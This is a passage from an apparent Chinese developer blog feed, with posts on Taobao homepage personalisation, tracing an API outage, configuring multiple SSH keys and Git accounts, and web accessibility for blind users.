src="https://img.alicdn.com/tps/i2/TB1aYAqLVXXXXbmXVXXhY.F2FXX-788-1602.png_800x800.jpg">--></p><p>在满足业务需求的前提下，更重要的是以人为中心，把用户喜欢的东西放到最醒目的位置。如下图「我常逛的」区块，通过算法介入，打分排序，从业务池子中的几十个模块中选出四个：</p><p><img src="/../blogimgs/2016/03/31/TB1qX.JLVXXXXa6XXXXUkF86VXX-1826-1566.png_800x800.jpg" alt="我常逛的"><!--<source src="https://img.alicdn.com/tps/i4/TB1qX.JLVXXXXa6XXXXUkF86VXX-1826-1566.png_800x800.jpg">--></p><p>每个模块中的很多数据都是通过个性化接口获取的，并且为了提高运营的执行效率，需要前端实现以下功能：</p><ul><li>对于整个区块，运营可以对业务置顶、排序</li><li>对于区块中的每个业务模块，支持运营配置其版式，以及配置该模块是否需要关闭个性化</li><li>对于模块中的每个数据坑位，支持运营干预是否需要个性化</li><li>对于部分业务模块，支持运营配置多条数据，然后算法决定出哪几条</li><li>而有部分业务，会采用自己的业务数据，该模块的渲染则需要独立处理</li></ul><p>简单而言，就是需要实现模块的位置、模板、内容（或者部分内容）个性化，同时对每个维度做开关控制。为了更好地告诉用户自己的属性，也会在导航上为用户打标：</p><p><img src="/../blogimgs/2016/03/31/TB1bxgkLVXXXXbTaXXXb.pt2pXX-398-978.png_600x600.jpg" alt="打标"><!--<source src="http://gtms04.alicdn.com/tps/i4/TB1bxgkLVXXXXbTaXXXb.pt2pXX-398-978.png_600x600.jpg">--></p><p>设计也会有个性化的需求，如不同地域的人群展示不同的内容：</p><p><img src="/../blogimgs/2016/03/31/TB1BJgDLVXXXXazXpXXt2D.NXXX-1950-1468.png_800x800.jpg" alt="member 区域背景个性化"><!--<source src="https://img.alicdn.com/tps/i4/TB1BJgDLVXXXXazXpXXt2D.NXXX-1950-1468.png_800x800.jpg">--></p><h3 id="前端面临的问题"><a href="#前端面临的问题" class="headerlink" title="前端面临的问题"></a>前端面临的问题</h3><p>先记住一句话：「不能相信任何数据源」，数据源出来的数据偶尔出乎你的意料，数据缺少条目、格式不对、状态不对、回调不对等等。</p><p>从上面的个性化需求可以看出，前端面临的问题还是不少的。</p><p><b>首先，数据的来源较多。</b> 每个区块采用的算法不一样，所以每个区块对应的数据接口也各不会相同，并且一个模块中，并不是所有数据都会走个性化接口，还有一部分数据来自运营的手工填写（运营手工填写的内容，部分同步渲染，部分异步渲染）。有些运营为了方便管理投放，如多个运营维护一个坑位的情况，会采用其他平台投放，前端需要通过平台接口获取数据；再加上部分业务有自己的后端服务，前端只能通过他们的后端接口获取数据；页面上还有不少阿里妈妈的广告，自然也是走他们的接口。约摸算来，整个首页的数据接口不下于 15 个。</p><p><b>大多数区块的渲染，需要经历两次串行的请求</b> 。首先通过算法接口拿到需要展示的模块 id 、模块排序和模块的个性化数据，然后通过模块 id 加载对应的非个性化数据（非个性化数据中包含了运营对个性化数据的干预逻辑），合并两个数据后才能渲染一个区块。有人问：</p><ul><li>是不是可以并行请求两者？答案是不能，业务模块实在是太多了，如果把所有 id 的模块数据都拿过来，数据太多。</li><li>算法那边是否可以将所有业务的数据都拿过去，然后只给前端传输整合后的数据？答案依然是不行，业务数据可能被实时修改，算法那边同步是个问题，目前没有较好的设施完成这套数据同步。</li><li>是否可以让算法的数据流过业务数据，将最后需要的数据过滤出来？答案是这很靠谱，然而这套体系还没有完善，本次改版无缘用上。</li></ul><p><b>第三个问题是，数据匹配问题</b>。业务模块有一个 id，这个 id 需要前端与后端约定好；而业务的非个性化数据因为要异步加载，也有一个数据请求 id，这个 id 由 TMS 平台产生，业务模块较多，两类 id 需要人肉匹配。在前后端的交互过程中，可能会出现如下问题：</p><ul><li>算法提供的数据 id 中有一个在前端这里找不到</li><li>算法提供的数据存在重复&#x2F;过少&#x2F;过多</li><li>算法提供的数据中某一项的数据格式不对</li></ul><p>前端还有一个模板匹配的问题，为了保证数据的纯洁性（其实是为了让运营配置后台清爽），光看业务数据是不知道该数据匹配哪种模板的，前端在区块配置列表中还得加上模块的模板 id，可以看看区块的配置后台：</p><p><img src="/../blogimgs/2016/03/31/TB1g6sLLVXXXXXGXXXXwOxT5VXX-2286-1152.png_1200x1200.jpg" alt="区块配置后台"><!--<source src="http://gtms01.alicdn.com/tps/i1/TB1g6sLLVXXXXXGXXXXwOxT5VXX-2286-1152.png_1200x1200.jpg">--></p><p>第四，也是一个让人头疼的问题，<b>兜底容灾的处理</b>，对于单模块单数据源的渲染，容灾是一件相当轻松的事情。而对于多模块多数据源的容灾处理，其逻辑的复杂程度超乎想象。</p><h3 id="黄金准则"><a href="#黄金准则" class="headerlink" title="黄金准则"></a>黄金准则</h3><p>为了让页面能够流畅地渲染，技术上下点功夫那是必须的！站在用户体验的角度去思考，其实很多问题都会迎刃而解：</p><ul><li>首屏一定要快</li><li>滚屏一定要流畅</li><li>能不加载的先别加载</li><li>能不执行的先别执行</li><li>渐进展现、圆滑展现</li></ul><p>在快的基础上做到手感丝滑，需要优化的点有很多，下篇将给大家带来 <a href="https://www.barretlee.com/blog/2016/04/01/optimization-in-taobao-homepage/">淘宝首页的性能优化实践</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个性化 </tag>
            
            <tag> 淘宝首页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对系统链路问题排查的一些看法</title>
      <link href="/blog/2016/03/19/problem-debugging/"/>
      <url>/blog/2016/03/19/problem-debugging/</url>
      
        <content type="html"><![CDATA[<p>页面上发现几个模块展示比较缓慢，白了大约 5s 之后展示兜底，显然，是接口请求超时了，打开控制台一看，果然，接口挂了。看了下相关页面，因为大量用到这个接口，模块也都加载超时了。换一台电脑看了下，存在一样的问题，确认是接口挂了。</p><span id="more"></span><p>10 min 左右后接口却又恢复正常。于是出现下面系列流程：</p><ul><li>联系相应的同学，最后找到能排查问题的人。</li><li>查看监控平台，发现确实没有数据过来。</li><li>查看服务器日志，发现确实没有日志进来，确认监控数据未出错。</li><li>结论是平台无错误。</li></ul><p>继续溯源，</p><ul><li>平台上一层是统一接入，查看 lvs，发现没有流量进来</li><li>查看机器系统日志，lvs 有人在调试</li></ul><p>当然，问题在这里已经找到了。如果这一步还没有找到，就需要继续溯源，看看域名解析是否有问题，DNS 解析是否有问题了。</p><h3 id="自动化的检测"><a href="#自动化的检测" class="headerlink" title="自动化的检测"></a>自动化的检测</h3><p>当用户发现网页模块超时加载后，</p><ul><li>前端系统警报</li><li>触发对应接口的链路查询</li><li>检查 DNS 解析是否正常</li><li>检查证书是否过期，是否正确部署</li><li>检查统一接入层是否有流量异常</li><li>检查平台监控数据是否异常</li><li>检查服务器日志是否异常</li><li>检查程序是否报错</li></ul><p>而这条链路也可以在平时正向冒烟测试，定期检查是否存在问题，提早发现问题，这样才能发挥监控的价值。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 网络技术 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链路问题排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多 SSH Key 管理技巧与 Git 多账户登录问题</title>
      <link href="/blog/2016/03/09/config-in-ssh-after-troubling-git-connection/"/>
      <url>/blog/2016/03/09/config-in-ssh-after-troubling-git-connection/</url>
      
        <content type="html"><![CDATA[<p>对很多开发者，尤其是手握几台甚至几十台机器的同学而言，登录到远程机器处理事务应该是家常便饭。如果你也是其中一员，悄悄问一句，你平时是如何记住一堆帐号、机器地址以及一些附加登录选项的呢？或许你也是这么干的：</p><span id="more"></span><p>倘若你有一个远程服务器，地址为 <code>test.server.com</code>, 防止人为攻击，你将 ssh 的端口号从 22 改成了 8892，当你需要登录到这台机器时，需要这么做：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ssh YOURNAME@test.server.com -p 8892</span><br><span class="line">password: *******</span><br></pre></td></tr></table></figure><p>尚好。如果你先前已经将已经注册了一个公钥&#x2F;私钥对，并且正确的部署到了远程机器，你可以省却输入密码这个环节（推荐学习 <code>ssh-copy-id</code> 命令）。</p><p>为了可以再懒一点，索性将这一串代码添加一个 alias：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">alias</span> <span class="built_in">test</span>=<span class="string">&#x27;ssh YOURNAME@test.server.com -p 8892&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>一条 <code>test</code> 命令即可让你登录到服务器，对于只有一两台远程机器的你，应该算是特别便捷了。</p><h3 id="多-SSH-Key-的管理"><a href="#多-SSH-Key-的管理" class="headerlink" title="多 SSH Key 的管理"></a>多 SSH Key 的管理</h3><p>SSH 连接建立之前，会在系统中寻找它的配置，一般有两个位置。</p><ul><li><code>/etc/ssh/ssh_config</code> 这里是对所有用户适用的全局配置</li><li><code>~/.ssh/config</code> 或者 <code>$HOME/.ssh/config</code> 这是用户的个人配置，这些配置会覆盖全局配置</li></ul><p>注意：一般来说，我们给 <code>~/.ssh</code> 文件夹赋予的权限为 <code>0700</code>。</p><p>配置格式比较简单，以下配置等同于上面我们的登录命令设置：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host test</span><br><span class="line">  HostName test.server.com</span><br><span class="line">  <span class="keyword">User</span> <span class="title">YOURNAME</span></span><br><span class="line">  Port <span class="number">8892</span></span><br></pre></td></tr></table></figure><p>可以是 <code>param value</code> 也可以为 <code>param=value</code>，其中 param 对大小写不敏感，value 对大小写敏感。</p><p>使用 <code>ssh test</code> 即可完成登录，当我们有稍微麻烦点配置的时候，如数据库的 3306 端口对外不开放，可以开放另一个接口，然后内部跳转到 3306，使用命令行的写法是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -f -N -L 8999:127.0.0.1:3306 <span class="built_in">test</span>@database.server.com</span><br></pre></td></tr></table></figure><p>大串的命令行，过多的参数，实在是有点不好记。而在 config 文件中的配置就一目了然：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host test</span><br><span class="line">  HostName test.server.com</span><br><span class="line">  <span class="keyword">User</span> <span class="title">YOURNAME</span></span><br><span class="line">  LocalForward <span class="number">8999</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span></span><br></pre></td></tr></table></figure><p>当你有多台远程终端的时候，config 文件的优势就更加明显了：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># serverlist </span></span><br><span class="line">Host list</span><br><span class="line">  HostName *.serverlist.com</span><br><span class="line">  <span class="keyword">User</span> <span class="title">YOURNAME</span></span><br><span class="line">  IdentityFile ~/.ssh/serverlist.com.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># personal server  </span></span><br><span class="line">Host personal</span><br><span class="line">  HostName proxy1.barretlee.com proxy2.barretlee.com</span><br><span class="line">  <span class="keyword">User</span> <span class="title">barretlee</span></span><br><span class="line">  IdentityFile ~/.ssh/proxy.barretlee.com.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># school</span></span><br><span class="line">HostName <span class="number">222.20</span>.<span class="number">74.89</span></span><br><span class="line">  <span class="keyword">User</span> <span class="title">school</span></span><br><span class="line">  LocalForward <span class="number">8999</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span></span><br><span class="line">  IdentityFile ~/.ssh/school.key</span><br><span class="line"><span class="comment"># and so on.  </span></span><br></pre></td></tr></table></figure><p>这里常用的的 param 也不是很多：</p><ul><li><code>Host</code>，SSH 连接名</li><li><code>HostName</code>，如上所示，可以是通配符，可以是 IP，也可以是域名等</li><li><code>User</code>，登录的用户名</li><li><code>IdentifyFile</code>，version 1 协议下默认是 <code>~/.ssh/identify</code>，version 2 协议下，默认是依次匹配：<code>~/.ssh/id_dsa</code>，<code>~/.ssh/id_ecdsa</code>，<code>~/.ssh/id_rsa</code>，还有 version 2 兼容模式。</li><li><code>LocalForward</code> 端口的内部跳转</li><li><code>Port</code>，端口设置，默认 SSH 的端口是 22</li><li><code>Protocal</code>，协议版本号，1 或者 2</li></ul><h3 id="Git-多账户登录问题"><a href="#Git-多账户登录问题" class="headerlink" title="Git 多账户登录问题"></a>Git 多账户登录问题</h3><p>向仓库 push 代码之前，我们都会做一番设置，简单归纳为如下几步：</p><ul><li>注册获取用户名 barretlee</li><li>创建仓库 <code>barretlee/test.git</code></li><li>创建密钥，<code>ssh-keygen -t rsa -C &quot;barret.china@gmail.com&quot;</code></li><li>将公钥 id_rsa.pub 填到 Git Server 上（如果没有可视化界面，还需要登录到 Server 命令行操作推送）</li><li>本地通过 ssh-agent 将密钥添加到 session 中，<code>ssh-add id_rsa</code>，部分终端中还需要手动开启 ssh-agent</li><li>然后测试连接，如 github 中， <code>ssh -T git@git.github.com</code></li><li>看到了 ‘welcome barretlee…’ 的提示，开始 push 你的代码</li></ul><p>突然有一天，你又注册了一个帐号 xiaohuzige，也走了一遍上面的流程，发现死活也连接不上，服务器总是提示：<code>You have no permission to access this repo</code>，这是怎么回事呢？</p><p>这个时候，你可以输入这个命令，看看是哪个环节出了问题：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ssh -vT git@github.com</span><br><span class="line">OpenSSH_6.9p1, LibreSSL 2.1.7</span><br><span class="line">debug1: Reading configuration data /Users/barretlee/.ssh/config</span><br><span class="line">debug1: /Users/barretlee/.ssh/config line 2: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 20: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: /etc/ssh/ssh_config line 102: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to github.com [192.30.252.128] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_rsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_dsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_dsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_ecdsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_ecdsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_ed25519 <span class="built_in">type</span> -1</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: identity file /Users/barretlee/.ssh/id_ed25519-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Enabling compatibility mode <span class="keyword">for</span> protocol 2.0</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_6.9</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version libssh-0.7.0</span><br><span class="line">debug1: no match: libssh-0.7.0</span><br><span class="line">debug1: Authenticating to github.com:22 as <span class="string">&#x27;git&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: server-&gt;client chacha20-poly1305@openssh.com &lt;implicit&gt; none</span><br><span class="line">debug1: kex: client-&gt;server chacha20-poly1305@openssh.com &lt;implicit&gt; none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ssh-rsa SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8</span><br><span class="line">debug1: Host <span class="string">&#x27;github.com&#x27;</span> is known and matches the RSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /Users/barretlee/.ssh/known_hosts:4</span><br><span class="line">Warning: Permanently added the RSA host key <span class="keyword">for</span> IP address <span class="string">&#x27;192.30.252.128&#x27;</span> to the list of known hosts.</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: Roaming not allowed by server</span><br><span class="line">debug1: SSH2_MSG_SERVICE_REQUEST sent</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Trying private key: /Users/barretlee/.ssh/id_rsa</span><br><span class="line">debug1: Trying private key: /Users/barretlee/.ssh/id_dsa</span><br><span class="line">debug1: Trying private key: /Users/barretlee/.ssh/id_ecdsa</span><br><span class="line">debug1: Trying private key: /Users/barretlee/.ssh/id_ed25519</span><br><span class="line">debug1: No more authentication methods to try.</span><br><span class="line">Permission denied (publickey).</span><br></pre></td></tr></table></figure><p>不加 v 参数，输出的内容很简洁：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ssh -T git@github.com</span><br><span class="line">Warning: Permanently added the RSA host key <span class="keyword">for</span> IP address <span class="string">&#x27;192.30.252.129&#x27;</span> to the list of known hosts.</span><br><span class="line">Permission denied (publickey).</span><br></pre></td></tr></table></figure><p>好吧，我知道你看不懂上面一长串的内容，也没心情看下去，但是你可以把焦点落到重复的那几段：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">debug1: ...</span><br><span class="line">debug1: xxx, No such file or directory</span><br><span class="line">debug1: ...</span><br><span class="line">debug1: Trying private key: /Users/barretlee/.ssh/xxx</span><br><span class="line">debug1: ...</span><br></pre></td></tr></table></figure><p>之前我们提到了 Protocal Version 1 和 Version 2，不同的版本号，默认的私钥地址不一样，所以程序会不断去尝试寻找默认的地址，如果没找到，最后会提示，授权失败，禁止访问。</p><p>我们可以在 push 代码之前，使用 ssh-agent 来管理私钥的 session，如：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ssh-add .ssh/coding_barretlee</span><br><span class="line">Identity added: ~/.ssh/coding_barretlee (coding_barretlee)</span><br><span class="line">➜  ~ ssh-add .ssh/github_barretlee</span><br><span class="line">Identity added: ~/.ssh/github_barretlee (github_barretlee)</span><br></pre></td></tr></table></figure><p>那么当程序寻找私钥的时候，就会优先到 ssh-agent 添加的 session 中寻找。session 的生命周期不是很长，当你重启电脑之后它就没了。如果你有遇到了 <code>Permission Denied</code> 的提示，请重新执行 ssh-add 命令。</p><p>当你在某个 Git 服务器上有多个帐号的时候，可能某个帐号总是提示：<code>Permission Denied</code>。拿 <code>coding.net</code> 上来说，我有两个账户，一个是 barretlee，另一个是 taobaofed，由于先前我一直用的 barretlee 账户，后来者 taobaofed 的代码死活推不上去。反反复复地检查配置，反反复复地检查上传的公钥，反反复复地使用 <code>ssh -T git@git.coding.net</code> 测试，没看到哪里不对，然而 taobaofed 的代码就是推不上去，这是怎么回事呢？</p><p>当然，上面 SSH 介绍了那么多，其简明易懂的配置在这里也是可以用上的：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">### default for all ##</span></span><br><span class="line">Host *</span><br><span class="line">     ForwardAgent no</span><br><span class="line">     ForwardX11 no</span><br><span class="line">     ForwardX11Trusted <span class="built_in">yes</span></span><br><span class="line">     User nixcraft</span><br><span class="line">     Port 22</span><br><span class="line">     Protocol 2</span><br><span class="line">     ServerAliveInterval 60</span><br><span class="line">     ServerAliveCountMax 30</span><br><span class="line"></span><br><span class="line"><span class="comment">## barretlee coding ##</span></span><br><span class="line">Host coding-barretlee</span><br><span class="line">     HostName git.coding.net</span><br><span class="line">     User barretlee</span><br><span class="line">     IdentityFile ~/.ssh/coding_barretlee</span><br><span class="line"></span><br><span class="line"><span class="comment">## taobaofed coding ##</span></span><br><span class="line">Host coding-taobaofed</span><br><span class="line">     HostName git.coding.net</span><br><span class="line">     User taobaofed</span><br><span class="line">     IdentityFile ~/.ssh/coding_taobaofed</span><br></pre></td></tr></table></figure><p>使用这种配置，我们可以避免使用 ssh-agent 添加 session 操作。可是，我就是按照上面的方式配置的呀，依然不行！</p><p>这里的问题在于，我们的 User 项不正确，每次推送代码的时候，git 会读取上次的的 User 配置，而我的配置是 barretlee，那么下次提交代码的时候虽然 IdentityFile 用对了，但是 User 不是 taobaofed，所以死活也推不动代码。</p><p>解决的方案很简单，如果在下载代码之前就已经设置好了两个帐号，你可以通过如下命令克隆代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ git <span class="built_in">clone</span> git@coding-taobaofed:taobaofed/blog.git</span><br></pre></td></tr></table></figure><p>如果是在已有的仓库中，其默认 origin 配置会是：<code>//git.coding.net/taobaofed/blog.git</code> 或者 <code>git@git.coding.net:taobaofed/blog.git</code>，你可以将仓库下的 <code>.git/config</code> 文件修改下：</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[remote <span class="string">&quot;origin&quot;</span>]</span><br><span class="line">  url = git<span class="variable">@coding</span>-<span class="symbol">taobaofed:</span>taobaofed/blog.git</span><br><span class="line">  fetch = +refs/heads/*<span class="symbol">:refs/remotes/origin/*</span></span><br></pre></td></tr></table></figure><p>防止克隆其他仓库代码也出现问题，我们可以将 <code>~/.ssh/config</code> 稍加修改：</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">## barretlee coding ##</span><br><span class="line">Host git.coding.net coding-barretlee</span><br><span class="line">     HostName git.coding.net</span><br><span class="line">     User barretlee</span><br><span class="line">     IdentityFile ~/.ssh/coding_barretlee</span><br><span class="line"></span><br><span class="line">## taobaofed coding ##</span><br><span class="line">Host coding-taobaofed</span><br><span class="line">     HostName git.coding.net</span><br><span class="line">     User taobaofed</span><br><span class="line">     IdentityFile ~/.ssh/coding_taobaofed</span><br></pre></td></tr></table></figure><p>那么，通过正常的 clone（如<code>git clone git@git.coding.net:barretlee/blog.git</code>）就不会出现 <code>Permission Denied</code> 的提示了。</p><p><strong>需要引起注意的一点：在寻找配置的时候，ssh 会优先查看 ssh-agent session 中的配置，然后才是 config 文件，如果你 ssh-add 添加过 key，建议执行如下操作：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ssh-add -D <span class="comment"># 删除所有的 session</span></span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>撰写本文之前，我已经踩坑三小时，花了三个小时，摸索出来这么些东西，感觉以后妈妈再也不用担心我的 Git&#x2F;SSH 的配置问题了。</p><p>最主要的手段依然是通过 <code>ssh -vT</code> 查看 SSH 交互过程中出现了什么障碍，debug 信息还是很有考究价值的！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
            <tag> GIT </tag>
            
            <tag> 多账户登录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识网页无障碍</title>
      <link href="/blog/2016/03/05/steps-of-web-content-accessibility/"/>
      <url>/blog/2016/03/05/steps-of-web-content-accessibility/</url>
      
        <content type="html"><![CDATA[<p>最近忙里偷闲坚持了好几个星期网页无障碍相关的学习和研究，看了很多文档，也在 Google 中寻觅了不少博客文章，总的来说就一个感受：规范文档太细节太长，博客指导性不强。</p><span id="more"></span><p>在 <a href="/blog/2016/02/28/step-in-aria/">上文</a> 中提到，信息无障碍并不是一种爱心公益活动，只是在大多数公司中，这方面的技术&#x2F;产品投入难以带来可观的利润，于是信息无障碍难以进入开发的流程之中，即便有工程师零零碎碎地在页面中加入了无障碍优化，一段时间的产品迭代之后，这些优化又荡然无存了。</p><p>我希望，通过一段时间的研究和实践，能够把我对网页无障碍化的理解表达出来，在学习的过程中，会去盲人社区交流，切身体会视障人士的处境，同时也会跟国内几位做了比较长时间网页无障碍研究的盲人开发者沟通，收获一些心得。</p><h3 id="认识网页无障碍化"><a href="#认识网页无障碍化" class="headerlink" title="认识网页无障碍化"></a>认识网页无障碍化</h3><p>站在一个用户的角度思考。当用户进入你的网站，他的目的应该是很明确的，在最短的时间内通过最快的方式找到自己想要的信息。正常人通过眼睛去捕捉网页上的信息，而视障人士主要通过耳朵，并使用读屏软件辅助读取页面的信息。</p><p>如果网页很长，链接很多，比如一些门户网站，盲人用起来就会特别吃力，PC 上通过 TAB 键从头开始往后聚焦，成千上万个链接堆叠在一坨，其恶心程度可以想象，我觉得能够鼓起勇气进入这些网站的盲人都是脾气相当不错的（如果是你，你会砸键盘么🙈）。</p><p>读屏软件不知道哪些信息是「重要信息」和「次要信息」，更加不清楚哪些信息是重复信息，有的时候读屏软件还会读到一些干扰信息（比如图形字符等）。</p><p>所谓的网页无障碍化，就是将网页信息有序的排列在一起，并且提供几个快捷入口让用户迅速找到关注点，然后排除干扰，我简单地理了下无障碍化的思路：</p><ul><li>第一步，让用户知道页面上有什么内容，比如使用 HTML5 的语义化标签以及 WAI-ARIA 中的 landmark 地标；</li><li>第二步，让用户可以轻松在页面的板块之间切换，比如添加快捷键支持；</li><li>第三步，让用户知道哪些是主要部分，甚至在进入页面的时候就提供快捷方式跳到主要内容的锚点；</li><li>第四步，去除页面干扰，如 iconfont 文字，相邻重复的链接等；</li><li>第五步，提供页面的交互支持，让自定义的组件如 tab、slide 都具备无障碍属性。</li></ul><p>稍微厘清上面五个步骤的思路，其实很简单，就是让信息模块化地呈现，这样就可以让耳朵更好的代替眼睛办事儿。</p><h3 id="理解和实践网页无障碍化"><a href="#理解和实践网页无障碍化" class="headerlink" title="理解和实践网页无障碍化"></a>理解和实践网页无障碍化</h3><p>掌握了整体的思路后就会清楚，哪些操作是有益于网页整体无障碍的，哪些操作是局部的微小优化，对于很多网站而言，我们可能不需要去关注细微的优化，因为这些事情读屏软件可以胜任。只要能够在整体上将一个网页乃至一个网站的无障碍体验做好，这就是网页无障碍化的最佳实践！</p><p>有些同学在做无障碍实践的时候没有真实理解盲人的需求，所以做出来的东西反而比没优化之前更加难用，比如滥用 tabindex，把网页内容的顺序排列得支离破碎，如果你正在做或者正准备做网页无障碍，请你一定要站在盲人的角度看问题。当然，最好你还能闭上眼睛拿着读屏软件测试下你写的页面。</p><p>不同的平台会有不同的读屏软件，由于各读屏软件对标准的实现存在偏差，甚至存在删减，最后导致不同平台下的读屏体验是不一样的，如同我们关注各浏览器之间的兼容性一般，在做无障碍测试的时候，也要关注不同读屏软件的差异。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>文本主要从网页无障碍的思路上做了一些阐述，可能不严谨，也可能有表述不当的地方，如果你对这方面有研究，欢迎提出你的观点，也期待更多人关注网页无障碍化。</p>]]></content>
      
      
      <categories>
          
          <category> 网页无障碍 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网页无障碍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息无障碍不是献爱心更不是做公益慈善</title>
      <link href="/blog/2016/02/28/step-in-aria/"/>
      <url>/blog/2016/02/28/step-in-aria/</url>
      
        <content type="html"><![CDATA[<p>自从两年前加入阿里巴巴的信息无障碍小组，平时的学习当中就多了一项内容，关注信息无障碍相关的文章，也经常去 W3C 上看看技术文档。</p><p>由于今年把无障碍相关的学习研究提高了一个优先级，每逢周末就会去网上搜寻下相关的文章，也因此认识了一些盲人朋友。</p><span id="more"></span><p>很多人以为盲人就是拿着一根拐杖，四处探路，等着被人帮助。你可能还不知道，很多盲人都在使用电脑和手机，并且也会做股票投资、在淘宝开店等，当然，他们用的很痛苦。技术本可以让视障人士同我们一样，自由穿梭在互联网的每个角落，但互联网的搭建者们，似乎还没有意识到，有一个群体，期待被我们关注，期待我们把信息无障碍植入到网络中。</p><p>我转了几段几位视障朋友人说过的话：</p><p>顾伶磊： </p><blockquote><p>在中国，互联网产品的无障碍化还非常遥远，没有几个人能真正理解无障碍化的含义。当你还把无障碍当成一项爱心事业在做的时候，你就已经注定失败了。</p></blockquote><blockquote><p>无障碍可用性本应该是一项规范，而不是一向爱心事业。如果你把他当成爱心事业去做，是注定不会长久的。在此我们呼吁，各大互联网企业和产品开发们，能帮忙推动无障碍的规范化，将无障碍可用性列入产品开发的规范中。</p></blockquote><p>东东保2011：</p><blockquote><p>现在很多企业把作无障碍看成是一种施舍，而并非是一种规范和义务。</p></blockquote><p>史明明-百年孤独：</p><blockquote><p>做无障碍不该被当成是做工艺、慈善、施舍，相信无障碍的相关法律法规一定会出台。</p></blockquote><p>黄龙小生：</p><blockquote><p>其实，无障碍它体现了人与人之间的平等，无障碍之所以有障碍表面乃是程序和工作问题，往深了说却是人性不平等的一面在作怪。在我们天朝大家认为做了这事情乃是公益事业乃是行善事，可是在人家那里，这些本来就是日常工作中的一部分而已。残障人身有残障，可是在这里却变得智有残障了。</p></blockquote><p>以及一位 <a href="http://www.qt.hk/about/">盲人技术开发者</a> 